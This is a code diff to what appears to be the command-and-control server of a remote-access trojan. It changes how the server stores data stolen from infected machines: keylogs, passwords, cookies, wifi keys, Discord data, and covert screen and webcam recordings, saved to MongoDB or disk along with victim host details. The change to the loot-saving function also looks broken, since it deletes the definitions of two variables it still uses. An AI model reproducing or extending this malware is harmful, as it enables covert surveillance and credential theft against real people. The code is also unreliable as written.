@@ -220,19 +220,21 @@ class DatabaseManager:
             self.execute("INSERT OR REPLACE INTO clients (id, ip_address, hostname, os, username, gpu, motherboard, status, last_seen, is_admin) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                         (client_id, ip, info.get('hostname'), info.get('os'), info.get('username'), info.get('gpu', ''), info.get('motherboard', ''), 'online', ts, info.get('is_admin', 0)))
 
-    def save_loot(self, client_id, l_type, filename, l_path):
+    def save_loot(self, client_id, l_type, filename, data, path=None):
         ts = datetime.datetime.now().isoformat()
         if self.use_mongo:
+            # For Mongo, we store the actual binary data in the 'data' field
             self.db.loot.insert_one({
                 "client_id": client_id,
                 "type": l_type,
                 "filename": filename,
-                "path": l_path,
-                "timestamp": ts
+                "data": data,
+                "timestamp": ts,
+                "size": len(data) if data else 0
             })
         else:
             self.execute("INSERT INTO loot (client_id, type, filename, path, timestamp) VALUES (?, ?, ?, ?, ?)",
-                        (client_id, l_type, filename, l_path, ts))
+                        (client_id, l_type, filename, path, ts))
 
 class AdvancedC2Server:
     def __init__(self, config: ServerConfig):
@@ -538,9 +540,23 @@ class AdvancedC2Server:
             if self._stream_writer:
                 self._stream_writer.release()
                 self._stream_writer = None
-            path = self._stream_rec_path
+            
+            path_str = self._stream_rec_path
+            msg = f'Screen recording stopped.'
+            
+            if self.db.use_mongo:
+                try:
+                    with open(path_str, 'rb') as f: data = f.read()
+                    self.db.save_loot(self._stream_active_cid or "server", "recordings", os.path.basename(path_str), data, f"db://recordings/{os.path.basename(path_str)}")
+                    os.remove(path_str) # Cleanup local file
+                    msg += " Saved to Database."
+                except Exception as e:
+                    msg += f" (Note: DB upload failed: {e})"
+            else:
+                msg += f" Saved to → {path_str}"
+            
             self._stream_rec_path = ''
-            return f'Screen recording saved → {path}'
+            return msg
         else:  # webcam
             if not self._webcam_recording:
                 return 'No active webcam recording'
@@ -548,9 +564,23 @@ class AdvancedC2Server:
             if self._webcam_writer:
                 self._webcam_writer.release()
                 self._webcam_writer = None
-            path = self._webcam_rec_path
+            
+            path_str = self._webcam_rec_path
+            msg = f'Webcam recording stopped.'
+            
+            if self.db.use_mongo:
+                try:
+                    with open(path_str, 'rb') as f: data = f.read()
+                    self.db.save_loot(self._webcam_active_cid or "server", "recordings", os.path.basename(path_str), data, f"db://recordings/{os.path.basename(path_str)}")
+                    os.remove(path_str) # Cleanup local file
+                    msg += " Saved to Database."
+                except Exception as e:
+                    msg += f" (Note: DB upload failed: {e})"
+            else:
+                msg += f" Saved to → {path_str}"
+
             self._webcam_rec_path = ''
-            return f'Webcam recording saved → {path}'
+            return msg
 
     def _handle_client(self, sock, addr):
         cid = None
@@ -749,34 +779,34 @@ class AdvancedC2Server:
         except queue.Full:
             pass
 
-    def _save_loot(self, cid, msg):
-        lt = msg.get('loot_type', 'misc')
-        fn = msg.get('filename') or f"{cid}_{lt}_{int(time.time())}.bin"
-        path = Path(self.config.loot_dir) / lt
-        path.mkdir(parents=True, exist_ok=True)
-        fpath = path / fn
-        
         try:
             data_bytes = base64.b64decode(msg.get('data', ''))
         except:
             data_bytes = str(msg.get('data', '')).encode()
-            
-        with open(fpath, 'wb') as f: f.write(data_bytes)
-        
-        self.db.execute('INSERT INTO loot (client_id, type, filename, path, timestamp) VALUES (?,?,?,?,?)',
-                       (cid, lt, fn, str(fpath), datetime.datetime.now().isoformat()))
-        
+
+        # If Mongo is not used, save to disk
+        fpath = None
+        if not self.db.use_mongo:
+            path = Path(self.config.loot_dir) / lt
+            path.mkdir(parents=True, exist_ok=True)
+            fpath = path / fn
+            with open(fpath, 'wb') as f: f.write(data_bytes)
+            fpath_str = str(fpath)
+        else:
+            fpath_str = f"db://loot/{fn}"
+
+        self.db.save_loot(cid, lt, fn, data_bytes, fpath_str)
+
         # Mark command as completed if there's an associated ID
         rid = msg.get('id')
         if rid:
-            result_summary = f"File successfully saved to: {fpath}"
-            # For text-based loot like keylog, we might want to attach a snippet of the text
+            result_summary = f"Loot successfully saved to Database (Atlas)." if self.db.use_mongo else f"File successfully saved to: {fpath_str}"
             if lt in ['keylog', 'passwords', 'cookies', 'wifi', 'discord']:
                 try:
                     snippet = data_bytes.decode('utf-8', errors='ignore')
-                    result_summary = f"File saved to: {fpath}\n\n[Preview]\n{snippet[-2000:]}"
+                    result_summary = f"Loot saved to DB.\n\n[Preview]\n{snippet[-2000:]}"
                 except: pass
-            
+
             self.db.update_command_status(rid, 'completed', result=json.dumps(result_summary))
             
         self.logger.success(f"LOOT COLLECTED from {cid}: {fn} ({lt})")
